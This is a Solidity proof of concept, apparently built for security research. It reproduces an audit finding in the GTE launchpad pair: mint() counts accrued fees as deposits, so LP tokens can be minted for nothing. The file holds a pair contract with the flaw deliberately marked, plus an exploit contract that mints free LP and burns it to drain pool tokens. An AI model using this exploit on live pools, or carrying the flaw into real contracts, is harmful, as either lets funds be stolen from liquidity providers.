// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    GTE — free LP mint when accrued launchpad fees are non-zero
    (Code4rena 2025-08-gte-perps-and-launchpad, finding #64853 / H-05)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: mint() computes amount{0,1} = balance - reserve. Reserves are
    balances minus accrued launchpad fees, so a call with no pre-transfer still
    sees amount{0,1} == fees and mints free LP. Same-block burns cash out the
    stolen share of pool assets.

    Blamed lines preserved with @> VULN markers
    (GTELaunchpadV2Pair.sol L187-L188 @ f43e1eed).
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "bal");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        require(balanceOf[from] >= amt, "bal");
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract GTELaunchpadV2Pair {
    uint256 public constant MINIMUM_LIQUIDITY = 10 ** 3;

    address public token0;
    address public token1;

    uint112 private reserve0;
    uint112 private reserve1;
    uint112 public accruedLaunchpadFee0;
    uint112 public accruedLaunchpadFee1;

    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    uint256 private unlocked = 1;
    modifier lock() {
        require(unlocked == 1, "LOCKED");
        unlocked = 0;
        _;
        unlocked = 1;
    }

    function getReserves() public view returns (uint112, uint112, uint32) {
        return (reserve0, reserve1, 0);
    }

    function initialize(address _t0, address _t1) external {
        token0 = _t0;
        token1 = _t1;
    }

    function seed(uint256 amount0, uint256 amount1, uint112 fee0, uint112 fee1, address lpTo) external {
        require(totalSupply == 0, "seeded");
        MockERC20(token0).transferFrom(msg.sender, address(this), amount0);
        MockERC20(token1).transferFrom(msg.sender, address(this), amount1);
        uint256 liq0 = amount0 - uint256(fee0);
        uint256 liq1 = amount1 - uint256(fee1);
        uint256 liquidity = _sqrt(liq0 * liq1) - MINIMUM_LIQUIDITY;
        balanceOf[address(0)] = MINIMUM_LIQUIDITY;
        balanceOf[lpTo] = liquidity;
        totalSupply = liquidity + MINIMUM_LIQUIDITY;
        accruedLaunchpadFee0 = fee0;
        accruedLaunchpadFee1 = fee1;
        reserve0 = uint112(MockERC20(token0).balanceOf(address(this))) - fee0;
        reserve1 = uint112(MockERC20(token1).balanceOf(address(this))) - fee1;
    }

    function transfer(address to, uint256 value) external returns (bool) {
        require(balanceOf[msg.sender] >= value, "lp");
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        return true;
    }

    function _mint(address to, uint256 value) internal {
        totalSupply += value;
        balanceOf[to] += value;
    }

    function _burn(address from, uint256 value) internal {
        balanceOf[from] -= value;
        totalSupply -= value;
    }

    // this low-level function should be called from a contract which performs important safety checks
    function mint(address to) external lock returns (uint256 liquidity) {
        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings
        uint256 balance0 = MockERC20(token0).balanceOf(address(this));
        uint256 balance1 = MockERC20(token1).balanceOf(address(this));
        // @> VULN: amount includes accrued fees when caller transferred nothing
        uint256 amount0 = balance0 - _reserve0;
        // @> VULN: same on token1
        uint256 amount1 = balance1 - _reserve1;
        // FIX: amount0 = balance0 - _reserve0 - accruedLaunchpadFee0;
        // FIX: amount1 = balance1 - _reserve1 - accruedLaunchpadFee1;

        uint256 _totalSupply = totalSupply;
        require(_totalSupply > 0, "no supply");
        liquidity = _min(amount0 * _totalSupply / _reserve0, amount1 * _totalSupply / _reserve1);
        require(liquidity > 0, "INSUFFICIENT_LIQUIDITY_MINTED");
        _mint(to, liquidity);

        reserve0 = uint112(balance0) - accruedLaunchpadFee0;
        reserve1 = uint112(balance1) - accruedLaunchpadFee1;
    }

    function burn(address to) external lock returns (uint256 amount0, uint256 amount1) {
        uint256 balance0 = MockERC20(token0).balanceOf(address(this));
        uint256 balance1 = MockERC20(token1).balanceOf(address(this));
        uint256 liquidity = balanceOf[address(this)];
        uint256 _totalSupply = totalSupply;
        amount0 = liquidity * balance0 / _totalSupply;
        amount1 = liquidity * balance1 / _totalSupply;
        require(amount0 > 0 && amount1 > 0, "INSUFFICIENT_LIQUIDITY_BURNED");
        _burn(address(this), liquidity);
        require(MockERC20(token0).transfer(to, amount0), "t0");
        require(MockERC20(token1).transfer(to, amount1), "t1");
        balance0 = MockERC20(token0).balanceOf(address(this));
        balance1 = MockERC20(token1).balanceOf(address(this));
        reserve0 = uint112(balance0) - accruedLaunchpadFee0;
        reserve1 = uint112(balance1) - accruedLaunchpadFee1;
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }

    function _sqrt(uint256 y) internal pure returns (uint256 z) {
        if (y > 3) {
            z = y;
            uint256 x = y / 2 + 1;
            while (x < z) {
                z = x;
                x = (y / x + x) / 2;
            }
        } else if (y != 0) {
            z = 1;
        }
    }
}

contract Exploit {
    MockERC20 public token0; // CREATE 1
    MockERC20 public token1; // CREATE 2
    GTELaunchpadV2Pair public pair; // CREATE 3 — vulnerable

    uint256 public freeLP;
    uint256 public stolen0;
    uint256 public stolen1;

    constructor() {
        token0 = new MockERC20("Base", "BASE");
        token1 = new MockERC20("Quote", "QUOTE");
        pair = new GTELaunchpadV2Pair();
        pair.initialize(address(token0), address(token1));
    }

    function run() external {
        uint256 seedAmt = 1_000_000e18;
        uint112 fee0 = 50_000e18;
        uint112 fee1 = 50_000e18;

        token0.mint(address(this), seedAmt + uint256(fee0));
        token1.mint(address(this), seedAmt + uint256(fee1));
        pair.seed(seedAmt + uint256(fee0), seedAmt + uint256(fee1), fee0, fee1, address(0xA11CE));

        uint256 before0 = token0.balanceOf(address(this));
        uint256 before1 = token1.balanceOf(address(this));

        // No pre-transfer — free mint because amount = fees
        freeLP = pair.mint(address(this));
        require(freeLP > 0, "no free LP");

        pair.transfer(address(pair), freeLP);
        (stolen0, stolen1) = pair.burn(address(this));

        require(token0.balanceOf(address(this)) > before0, "no token0 stolen");
        require(token1.balanceOf(address(this)) > before1, "no token1 stolen");
        require(stolen0 > 0 && stolen1 > 0, "harm not demonstrated");
    }
}
